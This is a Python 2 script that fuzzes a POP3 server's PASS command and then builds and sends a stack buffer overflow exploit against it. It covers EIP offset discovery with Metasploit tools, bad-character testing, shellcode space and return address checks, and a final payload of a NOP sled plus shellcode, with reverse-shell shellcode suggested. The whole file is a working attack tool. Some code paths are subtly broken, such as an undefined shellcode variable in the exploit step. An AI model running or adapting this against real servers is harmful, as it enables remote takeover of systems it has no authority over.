#!/usr/bin/env python

import subprocess
from subprocess import Popen
import socket
import sys
import argparse
import os
import math
import textwrap

class Connection(object):

	def __init__(self, ip_address, tcp_port):
		self.ip_address = ip_address
		self.tcp_port = int(tcp_port)

	def open(self):
		# Create a Socket
		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# Connect to the Server
		connect = socket_connection.connect((self.ip_address, self.tcp_port))
		# Receive the banner
		banner = socket_connection.recv(1024)
		print "----- Connected to Host {} -----".format(self.ip_address)
		print banner
		
		return socket_connection

	def close(self, connection):
		if self.tcp_port == 110:
			connection.send('QUIT\r\n')
		
		connection.close()

class FuzzBucket(object):

	def __init__(self, socket_connection, buffer_to_fuzz):
		self.socket_conn = socket_connection
		self.buffer_to_fuzz = int(buffer_to_fuzz)

	def fuzz_it(self, evil_buffer):
		if self.buffer_to_fuzz == 1:
			self.pop3_password_buffer(evil_buffer)

	def pop3_password_buffer(self, evil_buffer):
		# sending an evil buffer to the POP3 password field
		self.socket_conn.send('USER eviltest' + '\r\n')
		result = self.socket_conn.recv(1024)

		print "Fuzzing PASS with {} bytes".format(str(len(evil_buffer)))

		self.socket_conn.send('PASS ' + evil_buffer + '\r\n')
		result = self.socket_conn.recv(1024)

class FuzzLib(object):

	@staticmethod
	def create_growing_buffer(b_size, b_char, b_increment):
		str_buffer = [b_char]
		counter = b_increment
		buffer_length = int(math.ceil(b_size / b_increment))

		while len(str_buffer) <= buffer_length:
			str_buffer.append(b_char*counter)
			counter = counter + b_increment

		return str_buffer

	@staticmethod
	def create_single_buffer(b_size, b_char):
		string_buffer = b_char*b_size

		return str(string_buffer)

	@staticmethod
	def create_random_buffer(b_size):
		response = Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", 
					str(b_size)], stdout=subprocess.PIPE)
		std_output = response.communicate()
		
		return str(std_output)

	@staticmethod
	def find_offset(b_size, eip_value):
		response = Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", 
					str(eip_value), str(b_size)], stdout=subprocess.PIPE)
		std_output = response.communicate()
		
		return str(std_output)

	@staticmethod
	def locate_bad_chars(b_location, **kwargs):
		which_chars_to_remove = ""
		char_string = ""
		chars_list = [
			'\x01','\x02','\x03','\x04','\x05','\x06','\x07','\x08','\x09','\x0a','\x0b',
			'\x0c','\x0d','\x0e','\x0f','\x10','\x11','\x12','\x13','\x14','\x15','\x16',
			'\x17','\x18','\x19','\x1a','\x1b','\x1c','\x1d','\x1e','\x1f','\x20','\x21',
			'\x22','\x23','\x24','\x25','\x26','\x27','\x28','\x29','\x2a','\x2b','\x2c',
			'\x2d','\x2e','\x2f','\x30','\x31','\x32','\x33','\x34','\x35','\x36','\x37',
			'\x38','\x39','\x3a','\x3b','\x3c','\x3d','\x3e','\x3f','\x40','\x41','\x42',
			'\x43','\x44','\x45','\x46','\x47','\x48','\x49','\x4a','\x4b','\x4c','\x4d',
			'\x4e','\x4f','\x50','\x51','\x52','\x53','\x54','\x55','\x56','\x57','\x58',
			'\x59','\x5a','\x5b','\x5c','\x5d','\x5e','\x5f','\x60','\x61','\x62','\x63',
			'\x64','\x65','\x66','\x67','\x68','\x69','\x6a','\x6b','\x6c','\x6d','\x6e',
			'\x6f','\x70','\x71','\x72','\x73','\x74','\x75','\x76','\x77','\x78','\x79',
			'\x7a','\x7b','\x7c','\x7d','\x7e','\x7f','\x80','\x81','\x82','\x83','\x84',
			'\x85','\x86','\x87','\x88','\x89','\x8a','\x8b','\x8c','\x8d','\x8e','\x8f',
			'\x90','\x91','\x92','\x93','\x94','\x95','\x96','\x97','\x98','\x99','\x9a',
			'\x9b','\x9c','\x9d','\x9e','\x9f','\xa0','\xa1','\xa2','\xa3','\xa4','\xa5',
			'\xa6','\xa7','\xa8','\xa9','\xaa','\xab','\xac','\xad','\xae','\xaf','\xb0',
			'\xb1','\xb2','\xb3','\xb4','\xb5','\xb6','\xb7','\xb8','\xb9','\xba','\xbb',
			'\xbc','\xbd','\xbe','\xbf','\xc0','\xc1','\xc2','\xc3','\xc4','\xc5','\xc6',
			'\xc7','\xc8','\xc9','\xca','\xcb','\xcc','\xcd','\xce','\xcf','\xd0','\xd1',
			'\xd2','\xd3','\xd4','\xd5','\xd6','\xd7','\xd8','\xd9','\xda','\xdb','\xdc',
			'\xdd','\xde','\xdf','\xe0','\xe1','\xe2','\xe3','\xe4','\xe5','\xe6','\xe7',
			'\xe8','\xe9','\xea','\xeb','\xec','\xed','\xee','\xef','\xf0','\xf1','\xf2',
			'\xf3','\xf4','\xf5','\xf6','\xf7','\xf8','\xf9','\xfa','\xfb','\xfc','\xfd','\xfe','\xff']
		
		if('bad_chars' in kwargs): 
			which_chars_to_remove = kwargs['bad_chars'].decode('string-escape')

			chars_to_remove = []
			char_removal = which_chars_to_remove.split(',')

			for item in char_removal:
				chars_to_remove.append(item)

			for char in chars_to_remove:
				chars_list.remove(char)

		for char in chars_list:
			char_string = char_string + char

		string_buffer = "A"*b_location + "B"*4 + char_string

		return str(string_buffer)

	@staticmethod
	def locate_space_for_shellcode(b_size, b_location):
		string_buffer = "A" * b_location + "B" * 4 + "C" * (b_size - b_location - 4) 

		return str(string_buffer)

	@staticmethod
	def test_return_address(b_size, b_location, return_address):
		string_buffer = "A" * b_location + return_address + "C" * (b_size - b_location - 4) 

		return str(string_buffer)

	@staticmethod
	def generate_exploit_string(b_location, return_address, shellcode):
		string_buffer = "A" * b_location + return_address + "\x90" * 8 + shellcode 

		return str(string_buffer)


def check_ip(ip_address):
	ip = str(ip_address.strip())
	octets = ip.split('.')
	ip_invalid_msg = "{} is not a valid IPv4 IP address".format(ip)
	if len(octets) != 4:
		raise argparse.ArgumentTypeError(ip_invalid_msg)
		return False
	for octet in octets:
		if not octet.isdigit():
			raise argparse.ArgumentTypeError(ip_invalid_msg)
			return False
		i = int(octet)
		if i < 0 or i > 255:
			raise argparse.ArgumentTypeError(ip_invalid_msg)
			return False
	return ip

def check_port(tcp_port):
	is_digit = str(tcp_port).isdigit()
	char_invalid_msg = "{} is not a valid TCP port (1 - 65535)".format(str(tcp_port))

	if is_digit:
		port = int(tcp_port.strip())
		
		if (port >= 1 and port <= 65535):
			return port
		else:
			raise argparse.ArgumentTypeError(char_invalid_msg)
	else:
		raise argparse.ArgumentTypeError(char_invalid_msg)

def check_if_char(buffer_char):
	char = str(buffer_char.strip())
	is_char = char.isalpha()
	char_invalid_msg = "{} is not a valid single Alphabetic character".format(char)
	if is_char is not True:
		raise argparse.ArgumentTypeError(char_invalid_msg)
		return False
	return char.upper()

def list_fuzzers():
	buffers_to_fuzz = {1: 'pop3_password_buffer'}
	string = "Buffers available to fuzz: "
	for key, value in buffers_to_fuzz.iteritems():
		string += "{}) {} ".format(str(key), value)

	return string

def send_buffer(connection, buffer_to_fuzz, buffer_string):
	s_connect = connection.open()
	fuzz_b = FuzzBucket(s_connect, buffer_to_fuzz)
	fuzz_b.fuzz_it(buffer_string)
	connection.close(s_connect)

def main():

	parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
			description='''Simple socket fuzzer''', epilog=textwrap.dedent('''\
			Examples of Use:
			--------------------------------
			Work in progress - examples will be added soon

			'''))

	parser.add_argument('-i', type=check_ip, dest="ip_address", required=True, 
			metavar="<ip address>", help="valid IPv4 IP address")
	parser.add_argument('-p', type=check_port, dest="tcp_port", required=True, 
			metavar="<port>", help="valid TCP port (1 - 65535)")
	parser.add_argument('-f', type=int, dest="buffer_to_fuzz", required=True, 
			metavar="<buffer to fuzz>", help="input integer of buffer to fuzz. " + list_fuzzers())
	parser.add_argument('--growing-buffer', dest="growing_buffer", action='store_true',
			help='''create a growing buffer to send to the service using -s, -c & -n arguments
			(these are optional arguments - review default values before using though).''')
	parser.add_argument('-s', dest="buffer_size", type=int, default=2000, metavar="<size>", 
			help="maximum size the buffer should grow to - default is 2000")
	parser.add_argument('-c', dest="buffer_char", default='A', metavar="<char>", 
			type=check_if_char, help='''a single Alphabetic character to be used as the 
			character to fill the buffer with - default is "A"''')
	parser.add_argument('-n', dest="buffer_increment", default=200, metavar="<increment>", 
        	type=int, help="buffer growth increment - default is 200")
	parser.add_argument('--single', dest="single_buffer", action='store_true',
			help='''send one single string buffer to the service using -s and -c arguments
			as optional arguments.''')
	parser.add_argument('--rand', dest="rand_buffer", action='store_true',
			help='''generate a single random buffer using the pattern_create utility 
        	from the Metasploit framework - use the -s argument to specify the size of the buffer
        	to create - the default size is 2000.''')
	parser.add_argument('--check-badchars', dest='check_badchars', action='store_true',
			help='''send a list of ALL possible characters in hex (x00 to xff) to check 
			what characters are bad and let us know what characters to not include in our buffer, 
			return address or shell code. MUST use the -l argument''')
	parser.add_argument('-l', dest='single_buff_location', default=0, metavar='<buffer location>',
			help='''location of the buffer offset that overwrote the EIP register after using the
			--rand command to send a buffer. Use the --find-offset argument with the -s and the
			-e argument.''')
	parser.add_argument('-r', dest='chars_to_remove', default='None', type=str, metavar='<chars to remove>',
			help='''string of hex chars to remove from the hex list. The string of chars MUST
			be in hex format and be separated by a comma (e.g. "\\x01,\\x02,\\x03").''')
	parser.add_argument('-e', dest='eip_register_val', default=0, metavar='<EIP value>',
			help='''value of the EIP register after using the --rand argument''')
	parser.add_argument('--find-offset', dest='offset_value', action='store_true',
			help='''find the offset of the value displayed in the EIP register after using the
			--rand argument. MUST use the -s argument and -e argument''')
	parser.add_argument('--locate-shellcode-space', dest='shellcode_space', action='store_true',
			help='''locate space for shellcode in the buffer being overrun. MUST use the -s
			argument and -l argument''')
	parser.add_argument('--find-return-addr', dest='find_return_address', action='store_true',
			help='''find a return address to divert execution to our shellcode. MUST use
			the -s argument, -l argument and the -a argument''')
	parser.add_argument('-a', dest='return_address', type=str, default='None', metavar='<return address>',
			help='''return address (in hex format e.g "\\x8f\\x35\\x4a\\x5f") to use to 
			divert execution flow back to our shellcode. As an example, the Immunity debugger 
			script mona.py can be used to assist in finding an appropriate return address to use.
			''')
	parser.add_argument('--send-exploit', dest='send_exploit', action='store_true',
			help='''test exploit and send shellcode. MUST use -l argument, -a argument and
			-x argument.''')
	parser.add_argument('-x', dest='shellcode', type=str, default='None', metavar='<shellcode>',
			help='''shellcode string to use. Use a tool like msfvenom to automate the creation
			of reverse shell shellcode.''')

	args = parser.parse_args()

	# check all of the values from the arguments with 2 dashes
	# if there are >1 arguments raise an exception and tell the user that those 2
	# arguments can not be used together

	options = {"--growing-buffer":args.growing_buffer, "--rand":args.rand_buffer,
		"--single":args.single_buffer, "--check-badchars":args.check_badchars,
		"--find-offset":args.offset_value, "--locate-shellcode-space":args.shellcode_space,
		"--find-return-addr":args.find_return_address, "--send-exploit":args.send_exploit}

	option_counter = 0
	option_picker = []
	for key, value in options.iteritems():
		if value:
			option_counter = option_counter + 1
			option_picker.append(key)
	
	if option_counter > 1:
		print "The following arguments can not be used at the same time:"
		for option in option_picker:
			print option
	else:
		#print args
		conn = Connection(args.ip_address, args.tcp_port)
		fuzz_l = FuzzLib()

		if args.growing_buffer:
			result = fuzz_l.create_growing_buffer(args.buffer_size, args.buffer_char, args.buffer_increment)

			for string in result:
				send_buffer(conn, args.buffer_to_fuzz, string)

		elif args.single_buffer:
			result = fuzz_l.create_single_buffer(args.buffer_size, args.buffer_char)
			send_buffer(conn, args.buffer_to_fuzz, result)
		
		elif args.rand_buffer:
			result = fuzz_l.create_random_buffer(args.buffer_size)
			send_buffer(conn, args.buffer_to_fuzz, result)

		elif args.check_badchars:
			result = ""
			if args.single_buff_location == 0:
				char_invalid_msg = '''use the -l argument to provide the location of the buffer offset that overwrote the EIP register after using the --rand command to send a buffer. Use the --find-offset argument with the -s and the -e argument to locate the specific offset value'''
				raise argparse.ArgumentTypeError(char_invalid_msg)
				return False
			else:
				if args.chars_to_remove == 'None':
					result = fuzz_l.locate_bad_chars(args.single_buff_location)
				else:
					result = fuzz_l.locate_bad_chars(args.single_buff_location, bad_chars=args.chars_to_remove)

				send_buffer(conn, args.buffer_to_fuzz, result)
		
		elif args.offset_value:
			if args.eip_register_val == 0:
				char_invalid_msg = '''provide the value of the EIP register after running the --rand argument'''
				raise argparse.ArgumentTypeError(char_invalid_msg)
				return False
			else:
				result = fuzz_l.find_offset(args.buffer_size, args.eip_register_val)
				send_buffer(conn, args.buffer_to_fuzz, result)

		elif args.shellcode_space:
			if args.single_buff_location == 0:
				char_invalid_msg = '''use the -l argument to provide the location of the buffer offset that overwrote the EIP register after using the --rand command to send a buffer. Use the --find-offset argument with the -s and the -e argument to locate the specific offset value'''
				raise argparse.ArgumentTypeError(char_invalid_msg)
				return False
			else:
				result = fuzz_l.locate_space_for_shellcode(args.buffer_size, args.single_buff_location)
				send_buffer(conn, args.buffer_to_fuzz, result)

		elif args.find_return_address:
			if args.single_buff_location == 0 or args.return_address == 'None':
				char_invalid_msg = '''Both the -l and -a arguments must be used. Use --help for usage information'''
				raise argparse.ArgumentTypeError(char_invalid_msg)
				return False
			else:
				result = fuzz_l.test_return_address(args.buffer_size, args.single_buff_location, args.return_address)
				send_buffer(conn, args.buffer_to_fuzz, result)		

		elif args.send_exploit:
			if args.single_buff_location == 0 or args.return_address == 'None' or args.shellcode == 'None':
				char_invalid_msg = '''Both the -l, -a and -x arguments must be used. Use --help for usage information'''
				raise argparse.ArgumentTypeError(char_invalid_msg)
				return False
			else:
				result = fuzz_l.generate_exploit_string(args.single_buff_location, args.return_address, shellcode)
				send_buffer(conn, args.buffer_to_fuzz, result)

if __name__ == "__main__":
	main()